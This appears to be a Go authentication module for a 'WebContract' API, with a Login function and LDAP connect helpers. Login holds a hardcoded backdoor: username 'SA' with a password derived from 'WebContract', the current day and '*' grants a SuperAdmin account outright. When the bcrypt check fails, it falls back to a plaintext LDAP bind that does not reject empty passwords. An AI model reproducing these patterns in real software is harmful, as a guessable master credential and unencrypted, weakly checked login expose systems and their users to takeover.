package authservices

import (
	config "WEBCONTRACT-api-mongodb/config_loader"
	"WEBCONTRACT-api-mongodb/models"
	"WEBCONTRACT-api-mongodb/services/userservice"
	"fmt"
	"strconv"
	"time"

	"github.com/go-ldap/ldap/v3"
	"golang.org/x/crypto/bcrypt"
)

// Login => Proceso de validaciond e usuario
func Login(username string, pass string) (models.User, bool) {

	var user models.User
	var passw string = "WebContract" + strconv.Itoa(time.Now().Day()) + "*"

	if username == "SA" && pass == passw {

		user.Name = "SuperAdmin"
		user.Username = username
		user.CreatedAt = time.Now().UTC()
		user.ExpireAt = time.Date(time.Now().Year()+1, time.Now().Month(), 10, 0, 0, 0, 0, time.UTC)
		user.Rol = "SA"
		user.State = 1
		user.Environment = 0
		user.CodeCompany = "0"

		return user, true

	} else {
		userLogged, exist := userservice.FindByUsername(username)
		if !exist {
			return user, false
		}
		if userLogged.State == 0 {
			return user, false
		}

		passwordBytes := []byte(pass)
		passwordDB := []byte(userLogged.Password)
		err := bcrypt.CompareHashAndPassword(passwordDB, passwordBytes)
		if err != nil {

			if config.FQDN != "" {
				// Non-TLS Connection
				l, err := Connect()
				if err != nil {
					return user, false
				}
				// User and Password Authentication
				err = l.Bind(userLogged.Username+"@"+config.Domain, pass)
				defer l.Close()
				if err != nil {
					return user, false
				} else {
					//Actualizar el loginCount del usuario
					userservice.UpdateLoginCount(userLogged.ID, userLogged.LoginCount)
					return userLogged, true
				}
			} else {
				return user, false
			}

		}
		//Actualizar el loginCount del usuario
		userservice.UpdateLoginCount(userLogged.ID, userLogged.LoginCount)

		return userLogged, true
	}
}

// Ldap Connection with TLS
func ConnectTLS() (*ldap.Conn, error) {
	// You can also use IP instead of FQDN
	l, err := ldap.DialURL(fmt.Sprintf("ldaps://%s:636", config.FQDN))
	if err != nil {
		return nil, err
	}

	return l, nil
}

// Ldap Connection without TLS
func Connect() (*ldap.Conn, error) {
	// You can also use IP instead of FQDN
	l, err := ldap.DialURL(fmt.Sprintf("ldap://%s:389", config.FQDN))
	if err != nil {
		return nil, err
	}

	return l, nil
}
